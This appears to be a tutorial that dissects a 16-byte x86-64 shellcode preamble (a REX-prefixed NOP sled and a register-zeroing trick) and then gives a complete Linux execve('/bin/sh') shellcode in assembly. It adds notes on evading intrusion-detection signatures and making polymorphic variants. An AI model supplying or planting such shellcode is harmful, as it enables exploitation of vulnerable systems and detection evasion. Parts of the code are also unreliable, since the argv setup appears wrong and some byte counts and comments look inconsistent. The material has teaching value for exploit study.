Breaking Down the NOP Sled (Bytes 44 90 90...)

The first 10 bytes form a multi-byte NOP sled — a classic exploit technique used to increase the probability of landing execution flow on the real shellcode when control of the instruction pointer is imprecise.

The 44 90 Sequence

The byte 0x44 is a REX.R prefix in x86-64. When placed before 0x90 (a single-byte NOP), the CPU interprets this as a valid (though longer) no-operation instruction:

Encoding Meaning
0x90 NOP (1 byte)
44 90 REX.R NOP (2 bytes)

This is specifically uses 0x44 prefix here rather than the more common 0x66 (operand-size override) NOP variants. Why? Two reasons:

  1. Evasion. Signature-based NIDS (Snort, Suricata) often look for patterns of consecutive 0x90 bytes. Mixing in REX prefixes changes the byte pattern without changing execution semantics.
  2. Bad character avoidance. If the target buffer filters certain bytes, 0x44 may be allowed where 0x90-only sleds are flagged.

The structure of the sled is:

44 90   — 2-byte NOP (REX.R + NOP)
90       — 1-byte NOP  × 7
44       — orphan REX.R prefix (harmless)

Total: 10 bytes of landing zone.

The Payload: Zeroing Registers (Bytes 48 31 ff 48 f7 e7)

After the sled, we hit the actual shellcode:

48 31 ff — xor rdi, rdi

  • 48 = REX.W prefix (64-bit operand size)
  • 31 = XOR r/m64, r64 opcode
  • ff = ModRM byte encoding rdi as both source and destination

Result: RDI = 0

This zeros the rdi register, which on Linux x86-64 serves as the first argument register to syscalls. For an execve("/bin/sh") shellcode, setting rdi = 0 would be the argument for sys_read (stdin), but here it has a more important purpose — it's preparing a zero value for the multiplication trick coming next.

48 f7 e7 — mul rdi

  • 48 = REX.W prefix (64-bit)
  • f7 = MUL r/m64 opcode group
  • e7 = ModRM byte encoding rdi (operand is rdi)

Operation: RDX:RAX = RAX × RDI

Since we just zeroed rdi:

RAX = RAX × 0 = 0
RDX = 0 (high half of the result)

Result after these two instructions:

Register Value
RAX 0
RDX 0
RDI 0

Three registers zeroed in just 5 bytes. This is a well-known optimization trick — mul rdi is only 3 bytes (48 f7 e7), whereas the conventional xor rax, rax plus xor rdx, rdx would take 6 bytes (48 31 c0 48 31 d2). Also saves 1 byte by chaining the multiplication.

Putting It in Context

This is almost certainly the setup preamble for an execve("/bin/sh") syscall. After these 16 bytes, a complete shellcode would continue with:

Instruction Purpose
mov rdi, <"/bin/sh" addr> Argument 1: pointer to command string
xor rsi, rsi Argument 2: argv = NULL
(RDX already zeroed) Argument 3: envp = NULL
mov al, 59 Syscall number for execve
syscall Invoke the kernel

The conventional register-zeroing for execve requires:

  • rax = 0 (syscall number comes later)
  • rdi = 0 (or pointer to string)
  • rdx = 0

All three are satisfied by just xor rdi, rdi + mul rdi.

Evasion notes:

  • The 44 90 REX-prefixed NOP sequences evade naive 0x90-counting signatures
  • The mul rdi trick avoids the more commonly signatured 48 31 c0 (xor rax, rax) pattern
  • This is a Level-1 polymorphic variant — the register-zeroing destination can be altered (e.g., mul rbx after xor rbx, rbx) to produce functionally identical but byte-different shellcode

Conclusion

This 16-byte shellcode snippet is a compact, evasion-aware preamble. Demonstrates how solid understanding of:

  • x86-64 prefix encoding (REX.R for padded NOPs)
  • Multi-byte NOP sled construction for buffer overflow reliability
  • Instruction optimization (saving bytes with mul over xor sequences)
  • Signature evasion through non-standard byte patterns

Complete Shellcode: execve("/bin/sh") with the NOP Sled + Zeroing Preamble

Strategy

After preamble zeros rax, rdi, and rdx, we need to:

  1. Push a null-terminated /bin/sh string onto the stack
  2. Set rdi to point to that string
  3. Set rsi = 0 (argv = NULL)
  4. Set rax = 59 (execve syscall number)
  5. Execute syscall

Assembly Source

; x86-64 execve("/bin/sh") shellcode
; Total: 34 bytes
; Platform: Linux x86-64

BITS 64

_start:
    ; --- Preamble (16 bytes) ---
    db 0x44, 0x90               	; REX.R NOP (2-byte)
    db 0x90, 0x90, 0x90         	; NOP x3
    db 0x90, 0x90, 0x90, 0x90   	; NOP x4
    db 0x44                     	; orphan REX.R (harmless)
    db 0x48, 0x31, 0xff         	; xor rdi, rdi
    db 0x48, 0xf7, 0xe7         	; mul rdi   ; rax=0, rdx=0, rdi=0

    ; --- Shellcode body (18 bytes) ---
    movabs rbx, 0x68732f6e69622f
    ; rbx = "/bin/sh" (little-endian: hs/nib/)

    push   rdx                  	; null terminator (rdx is 0)
    push   rbx                  	; push "/bin/sh\0"
    push   rsp                  	; argv[0] = pointer to string
    pop    rdi                  	; rdi = address of "/bin/sh"

    ; rsi already 0 from the dynamic environment (or we set it)
    cdq                        		; sign-extend rax into rdx (rdx already 0, this is a NOP here — safe)
    ; Actually, let's explicitly zero rsi to be clean
    push   rdx                  	; argv terminator
    push   rdi                  	; argv[0]
    pop    rsi                  	; rsi = argv pointer

    push   59                   	; __NR_execve = 59
    pop    rax                  	; rax = syscall number
    syscall

done
